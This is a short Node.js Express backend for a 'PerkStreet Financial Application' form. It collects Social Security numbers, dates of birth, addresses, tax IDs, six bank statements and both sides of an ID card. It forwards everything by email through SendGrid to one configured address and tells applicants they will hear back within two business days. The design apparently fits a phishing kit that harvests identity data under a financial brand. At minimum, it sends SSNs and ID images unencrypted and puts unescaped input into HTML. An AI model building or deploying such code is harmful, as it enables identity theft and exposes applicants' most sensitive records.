const express = require("express");
const multer = require("multer");
const cors = require("cors");
const path = require("path");
const dotenv = require("dotenv");
const sgMail = require("@sendgrid/mail");

dotenv.config();
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.static(path.join(__dirname, "../frontend")));

const storage = multer.memoryStorage();
const upload = multer({ storage });

const uploadFields = [
  { name: "bank_statement_1" },
  { name: "bank_statement_2" },
  { name: "bank_statement_3" },
  { name: "bank_statement_4" },
  { name: "bank_statement_5" },
  { name: "bank_statement_6" },
  { name: "id_front" },
  { name: "id_back" },
];

app.post("/submit", upload.fields(uploadFields), async (req, res) => {
  try {
    const {
      ssn,
      dob,
      phone,
      email,
      business_name,
      business_address,
      home_address,
      ein_tax_id,
      business_phone,
      business_website,
      business_email,
      annual_revenue,
      position,
    } = req.body;

    const attachments = Object.values(req.files || {}).flat().map((file) => ({
      content: file.buffer.toString("base64"),
      filename: file.originalname,
      type: file.mimetype,
      disposition: "attachment",
    }));

    const msg = {
      to: process.env.RECEIVER_EMAIL,
      from: process.env.RECEIVER_EMAIL,
      subject: "New PerkStreet Financial Application",
      text: "New submission received.",
      html: `
        <h2>PerkStreet Financial Application</h2>
        <p><strong>SSN:</strong> ${ssn}</p>
        <p><strong>DOB:</strong> ${dob}</p>
        <p><strong>Phone:</strong> ${phone}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Business Name:</strong> ${business_name}</p>
        <p><strong>Business Address:</strong> ${business_address}</p>
        <p><strong>Home Address:</strong> ${home_address}</p>
        <p><strong>EIN / Tax ID:</strong> ${ein_tax_id}</p>
        <p><strong>Business Phone:</strong> ${business_phone}</p>
        <p><strong>Business Website:</strong> ${business_website}</p>
        <p><strong>Business Email:</strong> ${business_email}</p>
        <p><strong>Annual Revenue:</strong> ${annual_revenue}</p>
        <p><strong>Position:</strong> ${position}</p>
      `,
      attachments,
    };

    await sgMail.send(msg);
    res.send("You're all set! We've received the application. Our team will review the information and get back to you within two business days. Keep an eye on your inbox.");
  } catch (error) {
    console.error("Email sending failed:", error);
    res.status(500).send("An error occurred while processing your submission.");
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});